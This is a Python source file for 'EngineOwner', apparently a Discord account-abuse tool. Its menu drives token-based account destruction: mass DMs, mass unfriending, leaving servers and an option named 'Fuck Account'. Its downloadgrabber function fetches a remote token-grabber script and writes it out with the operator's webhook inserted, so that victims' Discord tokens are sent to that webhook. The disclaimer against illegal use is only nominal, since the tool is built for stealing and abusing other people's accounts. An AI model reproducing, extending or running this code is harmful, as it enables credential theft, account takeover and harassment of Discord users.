import requests
from os import system
from colorama import Fore
from tools.webhook import dwebhook
from tools.massdm import massdmer
from tools.tokeninfo import information
from tools.serverleaver import leaver
from tools.unfriend import unfriender
from tools.closedm import dmcloser
from tools.flashbang import fucker

title = "EngineOwner ║ github.com/itssnee/engine-owner"
system("title " + title)

banner = Fore.RED + """
___________              .__                ________                             
\_   _____/ ____    ____ |__| ____   ____   \_____  \__  _  ______   ___________ 
 |    __)_ /    \  / ___\|  |/    \_/ __ \   /   |   \ \/ \/ /    \_/ __ \_  __ 
 |        \   |  \/ /_/  >  |   |  \  ___/  /    |    \     /   |  \  ___/|  | \/
/_______  /___|  /\___  /|__|___|  /\___  > \_______  /\/\_/|___|  /\___  >__|   
        \/     \//_____/         \/     \/          \/           \/     \/        v1.0
                        ╔═════════════════════════╗         ╔═════════════════════════╗
                        ║  github.com/itssnee     ║         ║   github.com/itssnee    ║
                     ╔═══════════════════════════════╗   ╔═══════════════════════════════╗
                     ║ [1] Nuke Token                ║   ║ [10] Get All Friends          ║  
                     ║ [2] Leave Servers             ║   ║ [11] Get Token Info           ║
                     ║ [3] Delete Friends            ║   ║ [12] Token Checker            ║
                     ║ [4] Delete Servers            ║   ║ [13] Fuck Account             ║
                     ║ [5] Mass Dm                   ║   ║ [14] Delete Webhook           ║
                     ║ [6] Close DMs                 ║   ║ [15] Information              ║
                     ║ [7] Create Servers            ║   ║ [16] CREDITS                  ║
                     ║ [8] Block All Friends         ║   ║ [17] EXIT                     ║
                     ║ [9] Token Grabber Builder     ║   ║                               ║
                     ╚═══════════════════════════════╝   ╚═══════════════════════════════╝
                     We recommend Option 13 and 11
"""
option = Fore.RED + "     [>] "

def downloadgrabber(webhook):
    title2 = "EngineOwner ║ Token Grabber"
    system("title " + title2)
    url = 'https://cdn.discordapp.com/attachments/1014530090794766482/1014605376471183390/grabber.py'
    r = requests.get(url, allow_redirects=True)
    open('output/grabber.py', 'w', encoding='utf-8').write(r.content.decode().replace("WEBHOOK HERE", webhook))
    print(f"{Fore.RED}\n[ C ] Downloaded Successfully | File in /output/grabber.py\n")
    input('Press any key to continue')

def owner():
    lmao = input(banner + option)
    if lmao == "17":
        quit()
    elif lmao == "14":
        link = input("Enter the Webhook you want to delete.")
        dwebhook(link)
    elif lmao == "16":
        print("made by Snee")
        print("https://github.com/itssnee/engine-owner")
        print("To close this credit scene, press enter.")
        input("")
    elif lmao == "5":
        token = input(Fore.RED + "Token[>] ")
        message = input(Fore.RED + "Message[>] ")
        massdmer(token=token, content=message)
    elif lmao == "11":
        token2 = input(Fore.RED + "Token[>] ")
        information(token=token2)
    elif lmao == "2":
        token3 = input(Fore.RED + "Token[>] ")
        leaver(token=token3)
    elif lmao == "3":
        token4 = input(Fore.RED + "Token[>] ")
        unfriender(token=token4)
    elif lmao == "6":
        token5 = input(Fore.RED + "Token[>] ")
        dmcloser(token=token5)
    elif lmao == "15":
        input(Fore.RED + "By using this project, you agree to not use it for illegal activities, we(Snee, github.com/itssnee/) ARE NOT responsible for the user's actions.")
    elif lmao == "13":
        token6 = input(Fore.RED + "Token[>] ")
        fucker(token=token6)
    elif lmao == "9":
        webhook = input(Fore.RED + "Webhook[>] ")
        downloadgrabber(webhook=webhook)
owner()
